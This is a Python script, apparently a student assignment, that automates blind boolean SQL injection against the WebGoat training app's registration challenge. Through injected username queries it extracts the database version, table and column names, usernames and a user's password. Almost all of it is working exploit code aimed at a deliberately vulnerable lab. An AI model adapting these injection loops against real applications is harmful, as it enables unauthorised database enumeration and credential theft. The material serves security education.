import json
import string
import itertools
import requests
import pickle
import sys

from helpers import version, test, usernames


# def get_version():
#     headers = {
#         'Cookie': "JSESSIONID=ZACQ_4IVTBoYHeYkkuGdmE5DM_1vJZ79H-4nQrt2",
#     }
#
#     digits = string.digits + '.'
#     version = ''
#     digit_index = 0
#     version_index = 0
#
#     while True:
#         query = f'tom\' and substring(database_version(), {version_index + 1}, 1)=\'{digits[digit_index]}'
#         print(query)
#
#         data = {
#             'username_reg': query,
#             'email_reg': 'paul@gmail.com',
#             'password_reg': 'paul123',
#             'confirm_password_reg': 'paul123'
#         }
#
#         r = requests.put('http://172.17.0.2:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers,
#                          data=data)
#
#         try:
#             response = json.loads(r.text)
#
#         except:
#             print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
#             return False
#
#         if "already exists please try to register with a different username" not in response['feedback']:
#             digit_index += 1
#             if digit_index > len(digits) - 1:
#                 print('Final: ', version)
#                 return
#         else:
#             version += digits[digit_index]
#             print(version)
#             digit_index = 0
#             version_index += 1


def get_usernames():
    usernames = []
    keywords = ['USERID', 'USERNAME', 'USER_ID', 'USER_NAME', 'HANDLE']
    tables_columns = pickle.load(open('outputs/columns.pkl', 'rb'))
    alphabets = string.ascii_letters + string.digits + '_!@#$%^&*-+'
    print(alphabets)

    for table_column in tables_columns:
        table_name, columns = tuple(table_column.items())[0]
        if table_name.startswith('CHALLENGE'):
            for column in table_column[table_name]:
                program_state_usernames = []
                queue = ['']
                all_usernames = []
                username_dict = {(table_name, column): []}

                if column in keywords:
                    while queue:
                        queue_word = queue.pop(0)
                        for a in alphabets:
                            word = queue_word + a
                            if inject(word, len(word), table_name, column):
                                print(f'Found Word: {word}, {len(word)} - Table: {table_name}')
                                all_usernames.append(word)
                                queue.append(word)

                        program_state_usernames.append([queue, all_usernames])
                        pickle.dump(program_state_usernames, open('states/program_state_usernames.pkl', 'wb'))

                    for name in all_usernames:
                        if new_inject(table_name, column, name):
                            print(f'Found Username: {name}')
                            username_dict[(table_name, column)].append(name)
                    usernames.append(username_dict)
                    print(usernames)
                    pickle.dump(usernames, open('outputs/usernames.pkl', 'wb'))


def get_column_names():
    tables = []
    columns = []
    all_tables = pickle.load(open('outputs/tables.pkl', 'rb'))

    for i in all_tables:
        if i.startswith('CHALLENGE'):
            tables.append(i)

    alphabets = string.ascii_letters + '_'

    for table_name in tables:
        all_columns = []
        column_dict = {table_name: []}
        queue = ['']
        program_state_columns = []

        while queue:
            queue_word = queue.pop(0)
            for a in alphabets:
                word = queue_word + a
                if inject(word, len(word), table_name):
                    print(f'Found Word: {word}, {len(word)} - Table: {table_name}')
                    all_columns.append(word)
                    queue.append(word)

            program_state_columns.append([queue, all_columns])
            pickle.dump(program_state_columns, open('states/program_state_column.pkl', 'wb'))

        for name in all_columns:
            if new_inject(table_name, name):
                print(f'Found Column: {name}')
                column_dict[table_name].append(name)
        columns.append(column_dict)
        print(columns)
        pickle.dump(columns, open('outputs/columns.pkl', 'wb'))


def get_table_names():
    tables = []
    alphabets = string.ascii_letters + "_"
    queue = ['']
    all_names = []
    program_state = []

    while queue:
        queue_word = queue.pop(0)
        for a in alphabets:
            word = queue_word + a
            if inject(word, len(word)):
                print(f'Found Word: {word}, {len(word)}')
                all_names.append(word)
                queue.append(word)

        program_state.append([queue, all_names])
        pickle.dump(program_state, open('states/program_state.pkl', 'wb'))

    for name in all_names:
        if new_inject(name):
            print(f'Found Table: {name}')
            tables.append(name)
    print(tables)
    pickle.dump(tables, open('outputs/tables.pkl', 'wb'))


def new_inject(table_name, column_name="", user_id=""):
    headers = {
        'Cookie': "JSESSIONID=ZACQ_4IVTBoYHeYkkuGdmE5DM_1vJZ79H-4nQrt2",
    }

    query = f'tom\' and exists (select {column_name} from {table_name} where ' \
            f'{column_name}=\'{user_id}\')--'

    # query = f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
    # f'and column_name= \'{column_name}\')--'
    print(query)

    # table_query = f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE ' \
    #               f'table_name = \'{table_name}\')--'
    data = {
        'username_reg': query,
        'email_reg': 'paul@gmail.com',
        'password_reg': 'paul123',
        'confirm_password_reg': 'paul123'
    }

    r = requests.put('http://172.17.0.2:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers,
                     data=data)

    try:
        response = json.loads(r.text)

    except:
        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
        return False

    if "already exists please try to register with a different username" not in response['feedback']:
        return False
    else:
        return True


def inject(word, length, table_name="", column_name=""):
    headers = {
        'Cookie': "JSESSIONID=ZACQ_4IVTBoYHeYkkuGdmE5DM_1vJZ79H-4nQrt2",
    }

    query = f'tom\' and exists (select {column_name} from {table_name} where ' \
            f'substring({column_name},1, {length})=\'{word}\')--'

    # query = f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
    # f'and substring(column_name,1,{length})=\'{word}\')--'

    # query = f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE ' \
    #               f'SUBSTRING(table_name, 1, {length})=\'{word}\')--'
    print(query)
    data = {
        'username_reg': query,
        'email_reg': 'paul@gmail.com',
        'password_reg': 'paul123',
        'confirm_password_reg': 'paul123'
    }

    r = requests.put('http://172.17.0.2:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers,
                     data=data)

    try:
        response = json.loads(r.text)
        # print(response)

    except:
        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
        return False

    if "already exists please try to register with a different username" not in response['feedback']:
        return False
    else:
        return True


def get_password():
    alphabet_index = 0
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    password_index = 0
    password = ''

    headers = {
        'Cookie': 'JSESSIONID=nqe-NyKxIP3J5nJZbnxS_K55B4jphbCy3pwO55Mx',
    }

    while True:
        query = f'tom\' AND substring(password,{password_index + 1},1)=\'{alphabet[alphabet_index]}'
        print(query)
        data = {
            'username_reg': query,
            'email_reg': 'paul@gmail.com',
            'password_reg': 'paul123',
            'confirm_password_reg': 'paul123'
        }

        r = requests.put('http://172.17.0.2:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers, data=data)

        try:
            response = json.loads(r.text)
            print(response)
        except:
            print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
            return

        if "already exists please try to register with a different username" not in response['feedback']:
            alphabet_index += 1
            if alphabet_index > len(alphabet) - 1:
                return
        else:
            password += alphabet[alphabet_index]
            print(password)
            alphabet_index = 0
            password_index += 1


def menu():
    print()
    print(f'ASSIGNMENT 1')
    print(f'hrpaul@iu.edu')
    print()
    print(f'Enter option number,')
    print(f'1. Table Names')
    print(f'2. Database Version')
    print(f'3. Names of all columns contained in the table whose name starts with ‘CHALLENGE’')
    print(f'4. All original usernames stored in the table whose name starts with ‘CHALLENGE’')
    print(f'5. The password of user ‘tom’ stored in the table whose name starts with ‘CHALLENGE’.')
    print(f'6. Exit')
    print()


def exit():
    print(f'Thank you.')
    sys.exit(0)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    cookie = ''
    test.test()

    while 1:
        menu()
        try:
            option = int(input())
            if option not in range(1, 7):
                raise ValueError
            if option == 2:
                print(f'Version: {version.get_version(cookie)}')
            if option == 4:
                usernames.get_usernames(cookie)
            if option == 6:
                exit()

        except ValueError:
            print("Please enter values from 1-6 only.")

    # print(new_inject('CHALLENGE_USERS', 'EMAIL'))
    # print(new_inject('CHALLENGE_USERS', 'USERID', 'tom'))
    # test()
    # print(pickle.load(open('columns.pkl', 'rb')))
    # ['EMAIL', 'USERID', 'PASSWORD']
    # get_usernames()
    # get_column_names()
    # get_password()
    # get_table_names()
    # get_version()
